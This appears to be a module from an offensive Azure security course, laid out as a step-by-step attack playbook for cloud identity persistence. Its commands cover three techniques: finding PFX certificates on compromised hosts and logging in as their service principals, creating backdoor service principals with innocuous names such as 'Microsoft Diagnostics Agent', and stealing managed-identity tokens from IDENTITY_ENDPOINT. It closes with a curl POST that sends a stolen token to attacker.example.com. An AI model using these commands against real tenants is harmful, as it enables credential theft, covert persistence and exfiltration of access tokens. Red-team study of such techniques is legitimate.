# Attack — Module 05 (Persistence via Identities)

Three techniques for establishing durable cloud identity persistence: escalating privileges via found PFX certificates, registering backdoor Service Principals, and stealing tokens from managed identity runtime endpoints.

---

## Technique 1 — PFX Certificate Discovery to Service Principal Escalation

### Background

Azure Service Principals support certificate-based authentication. When a service principal is configured to use a certificate, the owner generates a PFX (PKCS#12) or PEM file containing both the **private key and the public certificate**. This file is the credential — anyone who possesses it can authenticate as that service principal without a password.

PFX files are frequently left on disk in:
- Developer workstations after running `az ad sp create-for-rbac --create-cert`
- CI/CD pipeline agents (GitHub Actions runners, Azure DevOps agents)
- App Service file system (via Kudu SCM or RBAC-authorized file read)
- Container image layers or mounted volumes
- Key Vault exports that land in storage blobs

> Reference: [Use an Azure service principal with certificate-based authentication — Microsoft Learn](https://learn.microsoft.com/en-us/cli/azure/azure-cli-sp-tutorial-3)

### Step 1 — Hunt for PFX Files on a Compromised Host

Once code execution exists on any Azure compute resource (VM, App Service, Container App, Logic App managed runtime), search for certificate files:

```bash
# Linux — find all PFX/PEM/P12 files
find / -name "*.pfx" -o -name "*.p12" -o -name "*.pem" 2>/dev/null

# Windows — PowerShell
Get-ChildItem -Path C:\ -Recurse -Include *.pfx,*.p12,*.pem -ErrorAction SilentlyContinue

# Azure App Service — Kudu SCM console
dir /s /b D:\home\*.pfx D:\home\*.pem D:\home\*.p12
```

Also check common storage paths for auto-generated certificates:

```bash
# Azure CLI default PEM output location (Linux)
ls -la ~/.azure/*.pem ~/tmp/*.pem /tmp/*.pem

# Azure DevOps agent work directory
find /agent/_work -name "*.pfx" 2>/dev/null
```

### Step 2 — Identify the Associated Service Principal

A PFX contains the certificate's thumbprint which ties it to an app registration. Extract it:

```bash
# Extract thumbprint from PFX (requires openssl)
openssl pkcs12 -in found.pfx -nokeys -passin pass: | \
  openssl x509 -noout -fingerprint -sha1

# Or from a PEM file
openssl x509 -in found.pem -noout -fingerprint -sha1
```

Then enumerate service principals to find which one owns that thumbprint:

```bash
az ad app list --all --query "[].{AppId:appId, Name:displayName}" -o table

# Once you identify the app:
az ad app credential list --id <AppId>
# Look for matching keyId / customKeyIdentifier (base64 thumbprint)
```

### Step 3 — Authenticate as the Service Principal

```bash
# Using PEM (preferred for az CLI)
az login --service-principal \
  --username <AppId> \
  --certificate /path/to/found.pem \
  --tenant <TenantId>

# Convert PFX to PEM first if needed
openssl pkcs12 -in found.pfx -out found.pem -nodes -passin pass:
az login --service-principal \
  --username <AppId> \
  --certificate ./found.pem \
  --tenant <TenantId>
```

### Step 4 — Enumerate Permissions and Escalate

```bash
# What subscriptions does this SP have access to?
az account list -o table

# What role assignments does this SP hold?
az role assignment list --assignee <AppId> --all -o table

# What API permissions does the app registration have?
az ad app permission list --id <AppId> -o table
```

---

## Technique 2 — Creating Backdoor Service Principals

### Background

An attacker with `Application Administrator`, `Cloud Application Administrator`, or `Global Administrator` privileges — or with `Owner`/`Contributor` rights and the ability to create app registrations — can create a net-new Service Principal that serves as a persistent backdoor account. Unlike user accounts, Service Principals do not require MFA, are not subject to Conditional Access policies targeting users, and do not appear in user-focused monitoring dashboards unless specifically queried.

> Reference: [Securing service principals — Microsoft Learn](https://learn.microsoft.com/en-us/entra/architecture/service-accounts-principal)

### Step 1 — Create the App Registration and Service Principal

```bash
# Create a new app registration (this simultaneously creates a service principal)
az ad app create --display-name "Microsoft Diagnostics Agent"

# Note the returned appId
APP_ID="<appId from output>"

# Create the service principal explicitly (if not auto-created)
az ad sp create --id $APP_ID
SP_ID=$(az ad sp show --id $APP_ID --query id -o tsv)
```

Choose a display name that blends in: `Microsoft Graph Connector`, `Azure Monitor Agent`, `Entra Sync Service`.

### Step 2 — Add a Credential to the Service Principal

```bash
# Add a client secret (password credential)
az ad app credential reset --id $APP_ID --append \
  --display-name "diag-key-01" \
  --years 2

# Or add a self-signed certificate
az ad app credential reset --id $APP_ID --append --create-cert
# Save the output PEM — this is the only time you'll have the private key
```

### Step 3 — Assign Roles to the Backdoor SP

```bash
# Assign Reader at subscription scope (low-noise, broad visibility)
az role assignment create \
  --assignee $SP_ID \
  --role "Reader" \
  --scope "/subscriptions/<subId>"

# Assign Contributor to a specific resource group for targeted persistence
az role assignment create \
  --assignee $SP_ID \
  --role "Contributor" \
  --scope "/subscriptions/<subId>/resourceGroups/<rgName>"

# Assign Microsoft Graph permissions (for identity reconnaissance)
az ad app permission add \
  --id $APP_ID \
  --api 00000003-0000-0000-c000-000000000000 \
  --api-permissions e1fe6dd8-ba31-4d61-89e7-88639da4683d=Scope  # User.Read
```

### Step 4 — Authenticate and Operate

```bash
# Authenticate with the client secret
az login --service-principal \
  --username $APP_ID \
  --password "<clientSecret>" \
  --tenant <TenantId>

# Confirm active session
az account show
```

The backdoor SP now authenticates independently of any compromised user account. Even if the original user's credentials are rotated or the account is disabled, the SP persists.

---

## Technique 3 — Managed Identity Token Theft via IDENTITY_ENDPOINT

### Background

Azure services that support managed identities expose a **local token endpoint** inside the runtime environment via two environment variables:

| Variable | Purpose |
|---|---|
| `IDENTITY_ENDPOINT` | Local HTTP URL for requesting access tokens |
| `IDENTITY_HEADER` | Secret header value (rotated by platform) required to authenticate the token request — mitigates SSRF abuse |

These variables are available to any process running inside the compute resource (App Service, Container Apps, Logic App managed runtime, Azure Functions). An attacker with code execution — via RCE, SSRF, command injection, or web shell — can read these variables and use them to obtain an Azure access token for whatever resources the managed identity has been granted access to.

> Reference: [Use managed identities for App Service and Azure Functions — REST endpoint reference](https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity#rest-endpoint-reference)
>
> Reference: [Managed identities in Azure Container Apps — Connect to Azure services in app code](https://learn.microsoft.com/en-us/azure/container-apps/managed-identity#connect-to-azure-services-in-app-code)

### Step 1 — Discover the Environment Variables

From code execution inside the target compute resource:

```bash
# Linux shell / container
echo $IDENTITY_ENDPOINT
echo $IDENTITY_HEADER
env | grep -i identity

# Windows / PowerShell
$env:IDENTITY_ENDPOINT
$env:IDENTITY_HEADER
[System.Environment]::GetEnvironmentVariables() | Where-Object { $_.Key -like "*IDENTITY*" }
```

If `IDENTITY_ENDPOINT` is set, the resource has a managed identity configured.

### Step 2 — Request an Access Token

```bash
# Request a token for Azure Resource Manager
curl -s "${IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}"

# Request a token for Microsoft Graph
curl -s "${IDENTITY_ENDPOINT}?resource=https://graph.microsoft.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}"

# Request a token for Azure Key Vault
curl -s "${IDENTITY_ENDPOINT}?resource=https://vault.azure.net&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}"
```

The response contains a bearer `access_token` valid for ~1 hour:

```json
{
  "access_token": "eyJ0eXAi...",
  "expires_on": "1745200000",
  "resource": "https://management.azure.com/",
  "token_type": "Bearer",
  "client_id": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
}
```

### Step 3 — Use the Token to Enumerate and Operate

```bash
TOKEN=$(curl -s "${IDENTITY_ENDPOINT}?resource=https://management.azure.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

# Enumerate subscriptions accessible to this managed identity
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"

# Enumerate resource groups
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<subId>/resourceGroups?api-version=2021-04-01"

# List storage accounts
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/<subId>/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01"
```

For Graph token — enumerate users, groups, applications:

```bash
GRAPH_TOKEN=$(curl -s "${IDENTITY_ENDPOINT}?resource=https://graph.microsoft.com/&api-version=2019-08-01" \
  -H "X-IDENTITY-HEADER: ${IDENTITY_HEADER}" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

curl -s -H "Authorization: Bearer $GRAPH_TOKEN" \
  "https://graph.microsoft.com/v1.0/users?\$top=10&\$select=displayName,userPrincipalName,id"
```

### Step 4 — Exfiltrate the Token for Offline Use

The token can be used from any network location for its lifetime (~1 hour), making the pivot off-premise:

```bash
# Send token to attacker-controlled endpoint
curl -s -X POST https://attacker.example.com/collect \
  -d "token=$TOKEN&resource=management"
```

---

## Attack Chain Summary

| Step | Technique | Key Action |
|---|---|---|
| 1 | PFX Discovery | `find / -name "*.pfx"` → `az login --service-principal --certificate` |
| 2 | Recon as SP | `az role assignment list --assignee <AppId>` |
| 3 | Backdoor SP Creation | `az ad app create` → `az ad app credential reset` → role assignment |
| 4 | Backdoor SP Auth | `az login --service-principal --password` |
| 5 | Managed Identity Enum | Read `$IDENTITY_ENDPOINT` / `$IDENTITY_HEADER` from env |
| 6 | Token Acquisition | `curl $IDENTITY_ENDPOINT` with `X-IDENTITY-HEADER` |
| 7 | Token Use / Exfil | ARM/Graph API calls with bearer token; forward token off-host |

---

## References

| Resource | URL |
|---|---|
| Service principal certificate-based authentication | https://learn.microsoft.com/en-us/cli/azure/azure-cli-sp-tutorial-3 |
| Create service principal with certificate (PowerShell) | https://learn.microsoft.com/en-us/entra/identity-platform/howto-authenticate-service-principal-powershell |
| Securing service principals | https://learn.microsoft.com/en-us/entra/architecture/service-accounts-principal |
| App Service managed identity — REST endpoint reference | https://learn.microsoft.com/en-us/azure/app-service/overview-managed-identity#rest-endpoint-reference |
| Container Apps managed identity — REST endpoint reference | https://learn.microsoft.com/en-us/azure/container-apps/managed-identity#rest-endpoint-reference |
